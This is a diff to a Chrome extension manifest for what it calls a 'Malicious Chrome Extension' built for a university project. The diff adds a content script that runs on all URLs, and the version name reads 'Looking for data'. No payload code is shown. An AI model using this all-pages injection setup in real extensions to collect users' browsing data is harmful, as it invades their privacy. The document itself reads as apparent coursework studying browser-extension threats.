@@ -2,8 +2,8 @@
 
     "name": "Malicious Chrome Extension",
     "description": "A malicious chrome extension build for a uni project.",
-    "version": "0.1",
-    "version_name": "0.1: Setting up",
+    "version": "0.1.1",
+    "version_name": "0.1.1: Looking for data",
     "manifest_version": 3,
     
     "permissions": [
@@ -14,6 +14,13 @@
     "background": {
         "service_worker": "script/bootstrap.js"
     },
+
+    "content_scripts": [
+        {
+            "matches": ["<all_urls>"],
+            "js": ["script/content_bootstrap.js"]
+        }
+    ],
 
     "action": {
         "default_popup": "index.html"
